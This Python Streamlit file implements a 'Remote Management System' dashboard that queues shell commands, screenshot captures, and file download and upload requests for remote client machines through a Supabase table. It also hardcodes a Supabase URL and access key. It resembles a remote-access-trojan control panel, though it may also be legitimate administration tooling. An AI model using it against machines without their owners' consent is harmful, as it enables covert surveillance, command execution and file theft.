import streamlit as st
import extra_streamlit_components as stx
from supabase import create_client
from datetime import datetime, timezone
import base64
from PIL import Image
import io
import time
import json

# Initialize Supabase
supabase = create_client(
    "https://nufgpguitvkxctpagwwf.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51ZmdwZ3VpdHZreGN0cGFnd3dmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY5NTA0MTIsImV4cCI6MjA1MjUyNjQxMn0.-MLSuSnfllGJrrQMEfHrQjxZoeujy6jZiHG9L9jY6Ik"
)

# Page Configuration
st.set_page_config(
    page_title="Remote Management System",
    page_icon="🖥️",
    layout="wide"
)

# Custom CSS
st.markdown("""
<style>
    /* Dashboard styles */
    .client-card {
        background-color: #1E1E1E;
        border: 1px solid #00FF00;
        border-radius: 10px;
        padding: 15px;
        margin: 10px 0;
    }
    .status-online {
        color: #00FF00;
        font-weight: bold;
    }
    .status-offline {
        color: #FF0000;
        font-weight: bold;
    }
    
    /* Command center styles */
    .terminal {
        background-color: #1E1E1E;
        color: #00FF00;
        font-family: monospace;
        padding: 10px;
        border-radius: 5px;
    }
    
    /* General styles */
    .stButton > button {
        width: 100%;
        margin-top: 10px;
    }
    .error-msg {
        color: #ff4b4b;
        margin-top: 10px;
    }
    .success-msg {
        color: #00ff00;
        margin-top: 10px;
    }
</style>
""", unsafe_allow_html=True)

# Dashboard Helper Functions
def decode_image(base64_string: str) -> Image.Image:
    try:
        img_bytes = base64.b64decode(base64_string)
        return Image.open(io.BytesIO(img_bytes))
    except Exception as e:
        st.error(f"Error decoding image: {str(e)}")
        return None

def get_client_status(last_seen: str) -> str:
    try:
        last_seen_time = datetime.fromisoformat(last_seen.replace('Z', '+00:00'))
        time_diff = datetime.now(timezone.utc) - last_seen_time
        return "online" if time_diff.total_seconds() < 60 else "offline"
    except Exception:
        return "unknown"

def send_command(client_id: str, command: str):
    try:
        data = {
            "client_id": client_id,
            "type": "command",
            "content": command,
            "status": "pending",
        }
        supabase.table('messages').insert(data).execute()
        return True
    except Exception as e:
        st.error(f"Error sending command: {str(e)}")
        return False

def render_dashboard():
    # Sidebar
    with st.sidebar:
        st.title("Navigation")
        
        # Get all clients
        clients = supabase.table('clients')\
            .select('*')\
            .order('last_seen', desc=True)\
            .execute()
            
        if not clients.data:
            st.warning("No clients connected")
            return
            
        selected_client = st.selectbox(
            "Select Client",
            options=[c['client_id'] for c in clients.data],
            format_func=lambda x: next(
                (f"{c['hostname']} ({c['client_id']})" 
                 for c in clients.data if c['client_id'] == x),
                x
            )
        )
        
        if selected_client:
            client = next((c for c in clients.data if c['client_id'] == selected_client), None)
            if client:
                st.markdown("### Client Details")
                st.markdown(f"**Hostname:** {client['hostname']}")
                st.markdown(f"**OS:** {client['os']}")
                st.markdown(f"**IP:** {client['ip_address']}")
                status = get_client_status(client['last_seen'])
                st.markdown(
                    f"**Status:** <span class='status-{status}'>{status.upper()}</span>",
                    unsafe_allow_html=True
                )
    
    # Main Content
    if selected_client:
        tabs = st.tabs(["Command Center", "Screenshot", "File Manager", "Message History"])
        
        # Command Center
        with tabs[0]:
            st.header("Command Center")
            with st.form("command_form"):
                command = st.text_input("Enter Command", placeholder="Type your command here")
                if st.form_submit_button("Execute"):
                    if command:
                        if send_command(selected_client, f"cmd {command}"):
                            st.success("Command sent successfully!")
        
        # Screenshot
        with tabs[1]:
            st.header("Screenshot")
            if st.button("Capture Screenshot"):
                if send_command(selected_client, "get image"):
                    st.success("Screenshot request sent!")
                    time.sleep(2)  # Wait for screenshot
        
        # File Manager
        with tabs[2]:
            st.header("File Manager")
            fm_tabs = st.tabs(["List Files", "Download File", "Upload File"])
            
            # List Files Section
            with fm_tabs[0]:
                st.subheader("List Files")
                directory = st.text_input("Directory", value=".")
                if st.button("List Files"):
                    command = f"file list {directory}"
                    if send_command(selected_client, command):
                        st.success("List Files command sent!")
            
            # Download File Section
            with fm_tabs[1]:
                st.subheader("Download File")
                filepath = st.text_input("File path to download")
                if st.button("Download File"):
                    command = f"file get {filepath}"
                    if send_command(selected_client, command):
                        st.success("Download command sent! Check Message History for file data.")
                        
                # Optionally, if you have already received a file message,
                # you can add a download button after decoding the message.
                # (This requires additional code to detect and render file messages.)
            
            # Upload File Section
            with fm_tabs[2]:
                st.subheader("Upload File")
                uploaded_file = st.file_uploader("Choose a file to upload")
                destination = st.text_input("Destination path on client", value="C:/destination/" )
                if st.button("Upload File"):
                    if uploaded_file and destination:
                        file_bytes = uploaded_file.read()
                        file_b64 = base64.b64encode(file_bytes).decode()
                        # Prepare a JSON payload with destination and file content
                        payload = json.dumps({
                            "destination": destination + uploaded_file.name,
                            "content": file_b64
                        })
                        command = f"file upload {payload}"
                        if send_command(selected_client, command):
                            st.success("Upload command sent!")
                    else:
                        st.error("Please select a file and specify a destination.")
        
        # Message History
        with tabs[3]:
            st.header("Message History")
            if st.button("Refresh Messages"):
                messages = supabase.table('messages')\
                    .select('*')\
                    .eq('client_id', selected_client)\
                    .order('created_at', desc=True)\
                    .limit(50)\
                    .execute()
                    
                for msg in messages.data:
                    with st.expander(
                        f"{msg['type'].upper()} - {msg['created_at']}",
                        expanded=False
                    ):
                        if msg['type'] == 'text':
                            st.code(msg['content'], language='bash')
                        elif msg['type'] == 'image':
                            img = decode_image(msg['content'])
                            if img:
                                st.image(img)
                        elif msg['type'] == 'file':
                            # For file messages, assume the content is a JSON payload.
                            try:
                                file_info = json.loads(msg['content'])
                                filename = file_info.get("filename", "downloaded_file")
                                file_b64 = file_info.get("content", "")
                                file_bytes = base64.b64decode(file_b64)
                                st.download_button("Download File", file_bytes, file_name=filename)
                            except Exception as e:
                                st.error(f"Error processing file message: {e}")
                        st.text(f"Status: {msg['status']}")

def main():
    render_dashboard()

if __name__ == "__main__":
    main()
